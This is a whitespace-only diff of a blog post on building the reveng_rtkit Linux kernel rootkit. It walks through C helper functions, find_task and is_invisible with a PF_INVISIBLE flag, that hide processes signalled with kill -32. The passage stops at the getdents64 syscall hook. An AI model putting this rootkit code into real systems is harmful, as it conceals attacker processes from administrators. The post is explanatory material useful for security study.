@@ -1370,102 +1370,102 @@ Remember that? **providing rootshell** portion earlier in this blog (if not, ple
 3. rsi: which contains the passed arguments.
 4. rdx: length of the passed argument(or string).
 ```
-      In this scenario, we will only need **rdi** and **rsi** register. This is because, we need to know the passed argument (**rsi** register, rather **si** register) and as we will be dealing with files, we will ofcourse be needing the file descriptors (**rdi** register, rather **di** register). (Reason was mentioned [here](http://--link---#### Now the question comes, "Why _`si`_ register, why not _`rsi`_ register?"))
+   In this scenario, we will only need **rdi** and **rsi** register. This is because, we need to know the passed argument (**rsi** register, rather **si** register) and as we will be dealing with files, we will ofcourse be needing the file descriptors (**rdi** register, rather **di** register). (Reason was mentioned [here](http://--link---#### Now the question comes, "Why _`si`_ register, why not _`rsi`_ register?"))
 
-       So, a recap about the Workflow of the machanism:\
-                - When we deliver pid of any process via `kill -32 <pid>`, it will at first find out that particular `pid` by surfing through "`/proc/`" directory.\
-                - After getting the `pid`, it will perform syscall hooking to hide that particular pid and then offering a new process list (excluding the mentioned pid), if the user tries to see running processes using ***ps***.
+   So, a recap about the Workflow of the machanism:\
+    - When we deliver pid of any process via `kill -32 <pid>`, it will at first find out that particular `pid` by surfing through "`/proc/`" directory.
+    - After getting the `pid`, it will perform syscall hooking to hide that particular pid and then offering a new process list (excluding the mentioned pid), if the user tries to see running processes using ***ps***.
 
-        1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L99).\
-           Finding the process id/ pid:\
-           According to [LKM_HACKING](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.):
+    1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L99).\
+   Finding the process id/ pid:\
+   According to [LKM_HACKING](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.):
 ```c
-                    /* Here, -"&gt;" is the html character entities, which really mean: -">" 
-                       I really don't know, how it happened in that site */
+	/* Here, -"&gt;" is the html character entities, which really mean: -">" 
+	I really don't know, how it happened in that site */
 
-                    /* get task structure from PID */
-                    struct task_struct *get_task(pid_t pid)
-                    {
-                      struct task_struct *p = current;
-                      do {
-                            if (p->pid == pid)
-                              return p;
-                            p = p->next_task;
-                          }
-                      while (p != current);
-                      return NULL;
-                    }
+	/* get task structure from PID */
+	struct task_struct *get_task(pid_t pid)
+	{
+		struct task_struct *p = current;
+	do {
+		if (p->pid == pid)
+			return p;
+		p = p->next_task;
+	}
+	while (p != current);
+	return NULL;
+}
 ```
-        I wasn't understanding this portion, but yes I was getting an idea that it is looping to get the process ids. So, I tried for loop.
+    I wasn't understanding this portion, but yes I was getting an idea that it is looping to get the process ids. So, I tried for loop.
 ```c
-                    // reveng_rtkit
+// reveng_rtkit
 
-                    #include <linux/sched.h>        /* task_struct: Core info about all the tasks */
+#include <linux/sched.h>        /* task_struct: Core info about all the tasks */
 
-                    struct task_struct *find_task(pid_t pid)
-                    {
-                      struct task_struct *target_process = current;
+struct task_struct *find_task(pid_t pid)
+{
+	struct task_struct *target_process = current;
 
-                    /* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601
-                     * for loop macro
-                     * #define for_each_process(p) \
-                     * for (p = &init_task ; (p = next_task(p)) != &init_task ; )
-                     */
-                      for_each_process(target_process)
-                      {
-                        if (target_process->pid == pid)
-                        {
-                          return target_process;
-                        }
-                      }
-                    return NULL;
-                    }
+	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601
+	 * for loop macro
+	 * #define for_each_process(p) \
+	 * for (p = &init_task ; (p = next_task(p)) != &init_task ; )
+	 */
+	for_each_process(target_process)
+	{
+		if (target_process->pid == pid)
+		{
+			return target_process;
+		}
+	}
+	return NULL;
+}
 ```
    This is basically a for loop macro. I got this expression from  [diamorphine](https://github.com/m0nad/Diamorphine/) project. Then searched it in [bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601).
                     
     2. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L118).\
    We will now make a function to hide those directories responsible for corresponding `pid`. Got this portion from [heroin](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#A-b) and [diamorphine](https://github.com/m0nad/Diamorphine/) project.
 ```c
-                   /* Here, -"&gt;" : -">" and "&amp;" : "&" */
+/* Here, -"&gt;" : -">" and "&amp;" : "&" */
 
-                   #define PF_INVISIBLE 0x10000000
+#define PF_INVISIBLE 0x10000000
                    
-                   int is_invisible(pid_t pid)
-                   {
-                      struct task_struct *task;
+int is_invisible(pid_t pid)
+{
+	struct task_struct *task;
 
-                      if((task = find_task(pid)) == NULL)
-                        return(0);
+	if((task = find_task(pid)) == NULL)
+		return(0);
 
-                      if(task-&gt;flags &amp; PF_INVISIBLE)
-                        return(1);
+	if(task-&gt;flags &amp; PF_INVISIBLE)
+		return(1);
 
-                      return(0);
-                   }
+	return(0);
+}
 ```
-    I made some changes,
+   I made some changes,
 ```c
-                   #define PF_INVISIBLE 0x10000000
+ #define PF_INVISIBLE 0x10000000
 
-                   static int is_invisible(pid_t pid)
-                   {
-                      struct task_struct *task = find_task(pid);
+static int is_invisible(pid_t pid)
+{
+	struct task_struct *task = find_task(pid);
 
-                      if (!pid)
-                      {
-                        return 0;
-                      }
+	if (!pid)
+	{
+		return 0;
+	}
 
-                      if (!task)
-                      {
-                        return 0;
-                      }
-                      if (task->flags & PF_INVISIBLE)
-                      {
-                        return 1;
-                      }
-                      return 0;
-                    }
+	if (!task)
+	{
+		return 0;
+	}
+	if (task->flags & PF_INVISIBLE)
+	{
+		return 1;
+	}
+	return 0;
+}
 ```
    Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/4eb75d38eee64a1d804e49220c9cbff092671faf/kernel_src/include/hook_syscall_helper.h#L137)\
     Now, comes the last and final part: ***getdents64*** syscall interception.
